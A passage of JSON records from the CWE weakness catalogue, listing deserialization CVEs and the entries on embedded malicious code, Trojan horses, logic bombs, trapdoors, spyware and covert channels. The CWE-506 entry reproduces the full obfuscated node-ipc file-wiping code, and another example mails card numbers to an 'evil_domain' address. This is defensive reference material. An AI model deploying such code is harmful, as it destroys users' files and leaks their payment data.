knowledge of the site secrets, allowing them to generate a valid hash via the wp_hash() function."}, {"Reference": "CVE-2022-33900", "Description": "PHP Object Injection vulnerability in Easy Digital Downloads plugin <= 3.0.1 at WordPress."}, {"Reference": "CVE-2022-35411", "Description": "rpc.py through 0.6.0 allows Remote Code Execution because an unpickle occurs when the \"serializer: pickle\" HTTP header is sent. In other words, although JSON (not Pickle) is the default data format, an unauthenticated client can cause the data to be processed with unpickle."}, {"Reference": "CVE-2022-3568", "Description": "The ImageMagick Engine plugin for WordPress is vulnerable to deserialization of untrusted input via the 'cli_path' parameter in versions up to, and including 1.7.5. This makes it possible for unauthenticated users to call files using a PHAR wrapper, granted they can trick a site administrator into performing an action such as clicking on a link, that will deserialize and call arbitrary PHP Objects that can be used to perform a variety of malicious actions granted a POP chain is also present. It also requires that the attacker is successful in uploading a file with the serialized payload."}, {"Reference": "CVE-2022-35857", "Description": "kvf-admin through 2022-02-12 allows remote attackers to execute arbitrary code because deserialization is mishandled. The rememberMe parameter is encrypted with a hardcoded key from the com.kalvin.kvf.common.shiro.ShiroConfig file."}, {"Reference": "CVE-2022-40202", "Description": " The database backup function in Delta Electronics InfraSuite Device Master Versions 00.00.01a and prior lacks proper authentication. An attacker could provide malicious serialized objects which, when deserialized, could activate an opcode for a backup scheduling function without authentication. This function allows the user to designate all function arguments and the file to be executed. This could allow the attacker to start any new process and achieve remote code execution. "}, {"Reference": "CVE-2022-40238", "Description": "A Remote Code Injection vulnerability exists in CERT software prior to version 1.50.5. An authenticated attacker can inject arbitrary pickle object as part of a user's profile. This can lead to code execution on the server when the user's profile is accessed."}, {"Reference": "CVE-2022-43567", "Description": "In Splunk Enterprise versions below 8.2.9, 8.1.12, and 9.0.2, an authenticated user can run arbitrary operating system commands remotely through the use of specially crafted requests to the mobile alerts feature in the Splunk Secure Gateway app. "}, {"Reference": "CVE-2022-44542", "Description": "lesspipe before 2.06 allows attackers to execute code via Perl Storable (pst) files, because of deserialized object destructor execution via a key/value pair in a hash."}, {"Reference": "CVE-2022-47083", "Description": "A PHP Object Injection vulnerability in the unserialize() function Spitfire CMS v1.0.475 allows authenticated attackers to execute arbitrary code via sending crafted requests to the web application."}, {"Reference": "CVE-2022-30287", "Description": "Horde Groupware Webmail Edition through 5.2.22 allows a reflection injection attack through which an attacker can instantiate a driver class. This then leads to arbitrary deserialization of PHP objects."}, {"Reference": "CVE-2022-32224", "Description": "A possible escalation to RCE vulnerability exists when using YAML serialized columns in Active Record < 7.0.3.1, <6.1.6.1, <6.0.5.1 and <5.2.8.1 which could allow an attacker, that can manipulate data in the database (via means like SQL injection), the ability to escalate to an RCE."}, {"Reference": "CVE-2021-26857", "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability"}, {"Reference": "CVE-2021-27852", "Description": "Deserialization of Untrusted Data vulnerability in CheckboxWeb.dll of Checkbox Survey allows an unauthenticated remote attacker to execute arbitrary code. This issue affects: Checkbox Survey versions prior to 7."}, {"Reference": "CVE-2021-31010", "Description": "A deserialization issue was addressed through improved validation. This issue is fixed in Security Update 2021-005 Catalina, iOS 12.5.5, iOS 14.8 and iPadOS 14.8, macOS Big Sur 11.6, watchOS 7.6.2. A sandboxed process may be able to circumvent sandbox restrictions. Apple was aware of a report that this issue may have been actively exploited at the time of release.."}, {"Reference": "CVE-2021-35464", "Description": "ForgeRock AM server before 7.0 has a Java deserialization vulnerability in the jato.pageSession parameter on multiple pages. The exploitation does not require authentication, and remote code execution can be triggered by sending a single crafted /ccversion/* request to the server. The vulnerability exists due to the usage of Sun ONE Application Framework (JATO) found in versions of Java 8 or earlier"}, {"Reference": "CVE-2021-39144", "Description": "XStream is a simple library to serialize objects to XML and back again. In affected versions this vulnerability may allow a remote attacker has sufficient rights to execute commands of the host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose."}, {"Reference": "CVE-2021-42237", "Description": "Sitecore XP 7.5 Initial Release to Sitecore XP 8.2 Update-7 is vulnerable to an insecure deserialization attack where it is possible to achieve remote command execution on the machine. No authentication or special configuration is required to exploit this vulnerability."}, {"Reference": "CVE-2021-42321", "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability"}, {"Reference": "CVE-2022-35405", "Description": "Zoho ManageEngine Password Manager Pro before 12101 and PAM360 before 5510 are vulnerable to unauthenticated remote code execution. (This also affects ManageEngine Access Manager Plus before 4303 with authentication.)"}, {"Reference": "CVE-2022-41082", "Description": "Microsoft Exchange Server Remote Code Execution Vulnerability"}, {"Reference": "CVE-2022-47986", "Description": " IBM Aspera Faspex 4.4.2 Patch Level 1 and earlier could allow a remote attacker to execute arbitrary code on the system, caused by a YAML deserialization flaw. By sending a specially crafted obsolete API call, an attacker could exploit this vulnerability to execute arbitrary code on the system. The obsolete API call was removed in Faspex 4.4.2 PL2. IBM X-Force ID: 243512. "}, {"Reference": "CVE-2021-35587", "Description": "Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)."}, {"Reference": "CVE-2022-22241", "Description": "An Improper Input Validation vulnerability in the J-Web component of Juniper Networks Junos OS may allow an unauthenticated attacker to access data without proper authorization. Utilizing a crafted POST request, deserialization may occur which could lead to unauthorized local file access or the ability to execute arbitrary commands. This issue affects Juniper Networks Junos OS: all versions prior to 19.1R3-S9; 19.2 versions prior to 19.2R3-S6; 19.3 versions prior to 19.3R3-S7; 19.4 versions prior to 19.4R2-S7, 19.4R3-S9; 20.1 versions prior to 20.1R3-S5; 20.2 versions prior to 20.2R3-S5; 20.3 versions prior to 20.3R3-S5; 20.4 versions prior to 20.4R3-S4; 21.1 versions prior to 21.1R3-S2; 21.2 versions prior to 21.2R3-S1; 21.3 versions prior to 21.3R2-S2, 21.3R3; 21.4 versions prior to 21.4R1-S2, 21.4R2-S1, 21.4R3; 22.1 versions prior to 22.1R1-S1, 22.1R2."}, {"Reference": "CVE-2022-36006", "Description": "Arvados is an open source platform for managing, processing, and sharing genomic and other large scientific and biomedical data. A remote code execution (RCE) vulnerability in the Arvados Workbench allows authenticated attackers to execute arbitrary code via specially crafted JSON payloads. This exists in all versions up to 2.4.1 and is fixed in 2.4.2. This vulnerability is specific to the Ruby on Rails Workbench application (\u201cWorkbench 1\u201d). We do not believe any other Arvados components, including the TypesScript browser-based Workbench application (\u201cWorkbench 2\u201d) or API Server, are vulnerable to this attack. For versions of Arvados earlier than 2.4.2: remove the Ruby-based \"Workbench 1\" app (\"apt-get remove arvados-workbench\") from your installation as a workaround."}]}
{"ID": "506", "Name": "Embedded Malicious Code", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains code that appears to be malicious in nature.", "ExtendedDescription": "Malicious flaws have acquired colorful names, including Trojan horse, trapdoor, timebomb, and logic-bomb. A developer might insert malicious code with the intent to subvert the security of a product or its host system at some time in the future. It generally refers to a program that performs a useful service but exploits rights of the program's user in a way the user does not intend.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "912", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Bundling"}, {"Phase": "Distribution"}, {"Phase": "Installation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "DetectionMethods": [{"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies\n\t\tGenerated Code Inspection", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAutomated Monitored Execution", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tManual Source Code Review (not inspections)", "Effectiveness": "SOAR Partial"}, {"Method": "Automated Static Analysis", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tOrigin Analysis", "Effectiveness": "SOAR Partial"}], "PotentialMitigations": [{"Phase": ["Testing"], "Description": "Remove the malicious code and start an effort to ensure that no more malicious code exists. This may require a detailed review of all code, as it is possible to hide a serious attack in only one or two lines of code. These lines may be located almost anywhere in an application and may have been intentionally obfuscated by the attacker."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the example below, a malicous developer has injected code to send credit card numbers to the developer's own email address."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tboolean authorizeCard(String ccn) {\n```\n// Authorize credit card.* \n\t\t\t\n\t\t\t\n\t\t\t *...* \n\t\t\t\n\t\t\tmailCardNumber(ccn, \"evil_developer@evil_domain.com\");}"}]}], "ObservedExamples": [{"Reference": "CVE-2022-30877", "Description": "A command history tool was shipped with a code-execution backdoor inserted by a malicious party.", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-30877"}], "RelatedAttackPatterns": ["442", "448", "636"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Notes": [{"Type": "Terminology", "Note": "The term \"Trojan horse\" was introduced by Dan Edwards and recorded by James Anderson [18] to characterize a particular computer security threat; it has been redefined many times [4,18-20]."}], "Top25Examples": [{"Reference": "CVE-2022-23812", "Description": "This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from \"path\"; import a from \"fs\"; import o from \"https\"; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t > 1) { return; } const n = Buffer.from(\"aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=\", \"base64\"); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(\"utf8\"), function (t) { t.on(\"data\", function (t) { const n = Buffer.from(\"Li8=\", \"base64\"); const o = Buffer.from(\"Li4v\", \"base64\"); const r = Buffer.from(\"Li4vLi4v\", \"base64\"); const f = Buffer.from(\"Lw==\", \"base64\"); const c = Buffer.from(\"Y291bnRyeV9uYW1l\", \"base64\"); const e = Buffer.from(\"cnVzc2lh\", \"base64\"); const i = Buffer.from(\"YmVsYXJ1cw==\", \"base64\"); try { const s = JSON.parse(t.toString(\"utf8\")); const u = s[c.toString(\"utf8\")].toLowerCase(); const a = u.includes(e.toString(\"utf8\")) || u.includes(i.toString(\"utf8\")); // checks if country is Russia or Belarus if (a) { h(n.toString(\"utf8\")); h(o.toString(\"utf8\")); h(r.toString(\"utf8\")); h(f.toString(\"utf8\")); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = \"\", o = \"\") { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from(\"4p2k77iP\", \"base64\"); for (var e = 0; e < r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length > 0 ? f.push(...s) : null; } else if (i.indexOf(o) >= 0) { try { a.writeFile(i, c.toString(\"utf8\"), function () {}); // overwrites file with ?? } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };"}, {"Reference": "CVE-2022-42041", "Description": "The d8s-file-system package for Python, as distributed on PyPI, included a potential code-execution backdoor inserted by a third party. The backdoor is the democritus-hashes package. The affected version is 0.1.0."}, {"Reference": "CVE-2022-42042", "Description": "The d8s-networking package for Python, as distributed on PyPI, included a potential code-execution backdoor inserted by a third party. The backdoor is the democritus-hashes package. The affected version is 0.1.0."}, {"Reference": "CVE-2022-30877", "Description": "The keep for python, as distributed on PyPI, included a code-execution backdoor inserted by a third party. The current version, without this backdoor, is 1.2."}]}
{"ID": "507", "Name": "Trojan Horse", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product appears to contain benign or useful functionality, but it also contains code that is hidden from normal operation that violates the intended security policy of the user or the system administrator.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "506", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "PotentialMitigations": [{"Phase": ["Operation"], "Description": "Most antivirus software scans for Trojan Horses."}, {"Phase": ["Installation"], "Description": "Verify the integrity of the product that is being installed."}], "RelatedAttackPatterns": ["698"], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}, "Notes": [{"Type": "Other", "Note": "Potentially malicious dynamic code compiled at runtime can conceal any number of attacks that will not appear in the baseline. The use of dynamically compiled code could also allow the injection of attacks on post-deployed applications."}, {"Type": "Terminology", "Note": "\n\nDefinitions of \"Trojan horse\" and related terms have varied widely over the years, but common usage in 2008 generally refers to software that performs a legitimate function, but also contains malicious code.\n\n\nAlmost any malicious code can be called a Trojan horse, since the author of malicious code needs to disguise it somehow so that it will be invoked by a nonmalicious user (unless the author means also to invoke the code, in which case they presumably already possess the authorization to perform the intended sabotage). A Trojan horse that replicates itself by copying its code into other program files (see case MA1) is commonly referred to as a virus. One that replicates itself by creating new processes or files to contain its code, instead of modifying existing storage entities, is often called a worm. Denning provides a general discussion of these terms; differences of opinion about the term applicable to a particular flaw or its exploitations sometimes occur.\n"}]}
{"ID": "508", "Name": "Non-Replicating Malicious Code", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "Non-replicating malicious code only resides on the target system or product that is attacked; it does not attempt to spread to other systems.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "507", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "PotentialMitigations": [{"Phase": ["Operation"], "Description": "Antivirus software can help mitigate known malicious code."}, {"Phase": ["Installation"], "Description": "Verify the integrity of the software that is being installed."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "509", "Name": "Replicating Malicious Code (Virus or Worm)", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "Replicating malicious code, including viruses and worms, will attempt to attack other systems once it has successfully compromised the target system or the product.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "507", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability"], "Impact": ["Execute Unauthorized Code or Commands"]}], "PotentialMitigations": [{"Phase": ["Operation"], "Description": "Antivirus software scans for viruses or worms."}, {"Phase": ["Installation"], "Description": "Always verify the integrity of the software that is being installed."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "51", "Name": "Path Equivalence: '/multiple//internal/slash'", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The product accepts path input in the form of multiple internal slash ('/multiple//internal/slash/') without appropriate validation, which can lead to ambiguous path resolution and allow an attacker to traverse the file system to unintended locations or access arbitrary files.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "41", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity"], "Impact": ["Read Files or Directories", "Modify Files or Directories"]}], "PotentialMitigations": [{"MitigationID": "MIT-20", "Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked."}], "ObservedExamples": [{"Reference": "CVE-2002-1483", "Description": "Read files with full pathname using multiple internal slash.", "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1483"}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "510", "Name": "Trapdoor", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A trapdoor is a hidden piece of code that responds to a special input, allowing its user access to resources without passing through the normal security enforcement mechanism.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "506", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Integrity", "Availability", "Access Control"], "Impact": ["Execute Unauthorized Code or Commands", "Bypass Protection Mechanism"]}], "DetectionMethods": [{"Method": "Automated Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInter-application Flow Analysis\n\t\tBinary / Bytecode simple extractor - strings, ELF readers, etc.", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Binary or Bytecode", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies\n\t\tGenerated Code Inspection", "Effectiveness": "SOAR Partial"}, {"Method": "Dynamic Analysis with Manual Results Interpretation", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAutomated Monitored Execution\n\t\tForced Path Execution\n\t\tDebugger\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious", "Effectiveness": "SOAR Partial"}, {"Method": "Manual Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source", "Effectiveness": "High"}, {"Method": "Automated Static Analysis - Source Code", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tContext-configured Source Code Weakness Analyzer", "Effectiveness": "SOAR Partial"}, {"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFormal Methods / Correct-By-Construction", "Effectiveness": "High"}], "PotentialMitigations": [{"Phase": ["Installation"], "Description": "Always verify the integrity of the software that is being installed."}, {"Phase": ["Testing"], "Description": "Identify and closely inspect the conditions for entering privileged areas of the code, especially those related to authentication, process invocation, and network communications."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "511", "Name": "Logic/Time Bomb", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains code that is designed to disrupt the legitimate operation of the product (or its environment) when a certain time passes, or when a certain logical condition is met.", "ExtendedDescription": "When the time bomb or logic bomb is detonated, it may perform a denial of service such as crashing the system, deleting critical data, or degrading system response time. This bomb might be placed within either a replicating or non-replicating Trojan horse.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "506", "ViewID": "1000", "Ordinal": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Mobile", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Other", "Integrity"], "Impact": ["Varies by Context", "Alter Execution Logic"]}], "PotentialMitigations": [{"Phase": ["Installation"], "Description": "Always verify the integrity of the product that is being installed."}, {"Phase": ["Testing"], "Description": "Conduct a code coverage analysis using live testing, then closely inspect any code that is not covered."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "Typical examples of triggers include system date or time mechanisms, random number generators, and counters that wait for an opportunity to launch their payload. When triggered, a time-bomb may deny service by crashing the system, deleting files, or degrading system response-time."}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "512", "Name": "Spyware", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product collects personally identifiable information about a human user or the user's activities, but the product accesses this information using other resources besides itself, and it does not require that user's explicit approval or direct input into the product.", "ExtendedDescription": "\"Spyware\" is a commonly used term with many definitions and interpretations. In general, it is meant to refer to products that collect information or install functionality that human users might not allow if they were fully aware of the actions being taken by the software. For example, a user might expect that tax software would collect a social security number and include it when filing a tax return, but that same user would not expect gaming software to obtain the social security number from that tax software's data.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "506", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"]}], "PotentialMitigations": [{"Phase": ["Operation"], "Description": "Use spyware detection and removal software."}, {"Phase": ["Installation"], "Description": "Always verify the integrity of the product that is being installed."}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "514", "Name": "Covert Channel", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "A covert channel is a path that can be used to transfer information in a way not intended by the system's designers.", "ExtendedDescription": "Typically the system has not given authorization for the transmission and has no knowledge of its occurrence.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1229", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}, {"Phase": "Operation"}], "CommonConsequences": [{"Scope": ["Confidentiality", "Access Control"], "Impact": ["Read Application Data", "Bypass Protection Mechanism"]}], "DetectionMethods": [{"Method": "Architecture or Design Review", "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)", "Effectiveness": "SOAR Partial"}], "DemonstrativeExamples": [{"ID": "DX-193", "Entries": [{"IntroText": "In this example, the attacker observes how long an authentication takes when the user types in the correct password."}, {"BodyText": "When the attacker tries their own values, they can first try strings of various length. When they find a string of the right length, the computation will take a bit longer, because the for loop will run at least once. Additionally, with this code, the attacker can possibly learn one character of the password at a time, because when they guess the first character right, the computation will take longer than a wrong guesses. Such an attack can break even the most sophisticated password with a few hundred guesses."}, {"Nature": "Bad", "Language": "Python", "ExampleCode": "```\n\tdef validate_password(actual_pw, typed_pw): \n\t\t\tif len(actual_pw) <> len(typed_pw): \n\t\t\t\treturn 0\n\t\t\tfor i in len(actual_pw): \n\t\t\t\tif actual_pw[i] <> typed_pw[i]: \n\t\t\t\t\treturn 0\n\t\t\treturn 1\n```"}, {"BodyText": "Note that in this example, the actual password must be handled in constant time as far as the attacker is concerned, even if the actual password is of an unusual length. This is one reason why it is good to use an algorithm that, among other things, stores a seeded cryptographic one-way hash of the password, then compare the hashes, which will always be of the same length."}]}], "RelatedAttackPatterns": ["463"], "MappingNotes": {"Usage": "Allowed-with-Review", "Rationale": "This CWE entry is a Class and might have Base-level children that would be more appropriate", "Comments": "Examine children of this entry to see if there is a better fit", "Reasons": ["Abstraction"]}, "Notes": [{"Type": "Theoretical", "Note": "A covert channel can be thought of as an emergent resource, meaning that it was not an originally intended resource, however it exists due the application's behaviors."}, {"Type": "Maintenance", "Note": "As of CWE 4.9, members of the CWE Hardware SIG are working to improve CWE's coverage of transient execution weaknesses, which include issues related to Spectre, Meltdown, and other attacks that create or exploit covert channels. As a result of that work, this entry might change in CWE 4.10."}], "Top25Examples": [{"Reference": "CVE-2022-20285", "Description": "In PackageManager, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-230868108"}, {"Reference": "CVE-2022-20287", "Description": "In AppSearchManagerService, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-204082784"}, {"Reference": "CVE-2022-20288", "Description": "In AppSearchManagerService, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-204082360"}, {"Reference": "CVE-2022-20289", "Description": "In PackageInstaller, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-203683960"}, {"Reference": "CVE-2022-20332", "Description": "In PackageManager, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-180019130"}]}
{"ID": "515", "Name": "Covert Storage Channel", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A covert storage channel transfers information through the setting of bits by one program and the reading of those bits by another. What distinguishes this case from that of ordinary operation is that the bits are used to convey encoded information.", "ExtendedDescription": "Covert storage channels occur when out-of-band data is stored in messages for the purpose of memory reuse. Covert channels are frequently classified as either storage or timing channels. Examples would include using a file intended to hold only audit information to convey user passwords--using the name of a file or perhaps status bits associated with it that can be read by all users to signal the contents of the file. Steganography, concealing information in such a manner that no one but the intended recipient knows of the existence of the message, is a good example of a covert storage channel.", "LikelihoodOfExploit": "High", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "514", "ViewID": "1000", "Ordinal": "Primary"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Confidentiality"], "Impact": ["Read Application Data"], "Note": "Covert storage channels may provide attackers with important information about the system in question."}, {"Scope": ["Integrity", "Confidentiality"], "Impact": ["Read Application Data"], "Note": "If these messages or packets are sent with unnecessary data contained within, it may tip off malicious listeners as to the process that created the message. With this information, attackers may learn any number of things, including the hardware platform, operating system, or algorithms used by the sender. This information can be of significant value to the user in launching further attacks."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Ensure that all reserved fields are set to zero before messages are sent and that no unnecessary information is included."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "An excellent example of covert storage channels in a well known application is the ICMP error message echoing functionality. Due 